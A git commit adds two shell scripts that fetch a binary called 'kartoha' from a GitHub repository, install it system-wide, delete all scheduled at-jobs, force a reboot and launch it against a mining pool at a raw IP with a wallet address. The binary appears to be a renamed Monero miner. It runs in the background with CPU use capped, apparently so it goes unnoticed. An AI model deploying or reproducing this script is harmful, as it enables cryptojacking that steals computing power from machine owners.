0ccd6f1cef7383ad880e9970d44a3029eaab555e
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-03-04 20:11:15 +0000

    Add files via upload

---
+++ 75.sh
@@ -0,0 +1,3 @@
+pkill kartoha
+sleep 7
+kartoha -o 116.203.118.49:1849 -u 4ACZyj95q3GehCGVR8HET3B6SKFvhS3vu78WVMZQCs8vAqSY8GqgrKRc6PxFqchNv6EzdY2mkMKxdfpYS6sL57fXQKokGmL --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=45 --av=1 --variant -1
---
+++ test502.sh
@@ -0,0 +1,42 @@
+#!/bin/bash
+
+ID="$(hostname)"
+
+THREADS="$(nproc --all)"
+
+touch /tmp/at.txt
+echo 'sudo reboot -f' >> /tmp/at.txt
+at now + 24 hours < /tmp/at.txt
+echo -e 'Restart job specified'
+sleep 3
+
+
+rm -rf /tmp/kartoha/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir kartoha
+git clone https://github.com/tortikon/kartoha.git /tmp/kartoha
+cd /tmp/kartoha
+chmod +x /tmp/kartoha/kartoha
+chmod 777 ./*.sh
+cp /tmp/kartoha/kartoha /usr/bin/
+sleep 3
+
+
+sudo apt-get install dos2unix
+
+dos2unix time1.sh
+dos2unix 75.sh
+dos2unix 50.sh
+dos2unix 80.sh
+dos2unix 65.sh
+dos2unix 90.sh
+dos2unix 40.sh
+
+sudo ./time1.sh
+
+
